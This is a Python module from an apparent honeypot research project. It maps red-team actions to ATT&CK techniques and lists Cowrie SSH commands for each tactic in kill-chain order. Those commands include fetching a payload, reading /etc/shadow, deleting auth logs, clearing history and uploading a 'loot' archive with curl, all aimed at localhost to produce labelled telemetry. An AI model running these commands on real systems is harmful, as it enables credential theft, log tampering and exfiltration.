"""
red_team/playbook.py  –  Cowrie TTP sequences + ATT&CK grounding lookup
========================================================================
Two things live here:

1. A thin lookup over the project's SINGLE source of ATT&CK truth,
   `attack_grounding.ATTACKER_GROUNDING` (verified against attack.mitre.org and
   mirrored by the frontend `src/data/attackMap.ts`). The red-team reuses that
   table rather than carrying its own copy, so the demo, the paper table, and
   the UI can never drift apart. `attack_info()` and `ATT_CK_MAP` are just
   views onto it in the shapes the red-team code already expects.

2. HONEYPOT_TTPS — for the subset of actions that can be exercised against a
   real Cowrie SSH honeypot, the concrete shell commands that produce the
   telemetry the defender was trained to read. Because the red-team agent picks
   each TTP, the resulting honeypot events are SELF-LABELED. These are
   Cowrie-specific and have no place in the grounding table, so they live here.

Cowrie logs `cowrie.command.input` (with the raw command) and
`cowrie.login.failed/success`; telemetry_adapter.py keys off those event ids
and the SUSPICIOUS_TOKENS/SCAN_TOKENS/PRIV_ESC_TOKENS in the command text, so
the commands below are chosen to land in the right observation buckets.
"""

from __future__ import annotations

from typing import Dict, List

from shared_honeypot_env import ATT_ACTION_NAMES
from attack_grounding import ATTACKER_GROUNDING

# name → index, so callers can look up either way without drifting from the env.
ACTION_INDEX: Dict[str, int] = {n: i for i, n in enumerate(ATT_ACTION_NAMES)}

# Build the map the red-team code expects from the verified grounding table.
# Keys mirror the old playbook shape (technique_id / technique / tactic /
# rationale) so callers are unchanged, but the DATA now comes from the single
# source of truth — no second, divergent copy of the ATT&CK IDs.
ATT_CK_MAP: Dict[str, Dict[str, str]] = {
    g.action: {
        "technique_id": g.technique or "—",
        "technique":    g.name or g.action,
        "tactic":       g.tactic if g.tactic and g.tactic != "n/a" else "—",
        "rationale":    g.note,
    }
    for g in ATTACKER_GROUNDING
}


def attack_info(action) -> Dict[str, str]:
    """Look up the ATT&CK record for an action index or name."""
    name = action if isinstance(action, str) else ATT_ACTION_NAMES[int(action)]
    return {"action": name, **ATT_CK_MAP.get(name, {
        "technique_id": "—", "technique": name, "tactic": "—", "rationale": ""})}


# ── Cowrie honeypot command sequences (self-labeled telemetry) ────────────────
# Each entry: the TTP label → the shell commands to run inside the Cowrie SSH
# session. Kept deliberately benign-but-representative: they exercise Cowrie's
# command logging and the adapter's token buckets without doing anything the
# honeypot can't safely emulate.
HONEYPOT_TTPS: Dict[str, List[str]] = {
    "passive_recon":   ["uname -a", "id", "cat /etc/os-release"],
    "active_scan":     ["nmap -p- localhost", "netstat -tulpn"],
    "exploit_service": ["wget http://127.0.0.1/payload.sh", "chmod +x payload.sh"],
    "escalate_privilege": ["sudo su -", "su root"],
    "dump_credentials": ["cat /etc/shadow", "cat /etc/passwd"],
    "defense_evasion": ["rm -rf /var/log/auth.log", "history -c"],
    "collect_data":    ["tar czf /tmp/loot.tgz /home", "ls -la /tmp"],
    "exfiltrate":      ["curl -T /tmp/loot.tgz http://127.0.0.1/upload"],
    "execute_impact":  ["bash -c 'echo pwned > /root/NOTICE'"],
}

# The order the default honeypot playbook walks through (a coherent kill chain).
DEFAULT_HONEYPOT_ORDER: List[str] = [
    "passive_recon", "active_scan", "exploit_service",
    "escalate_privilege", "dump_credentials", "collect_data",
    "exfiltrate", "defense_evasion",
]
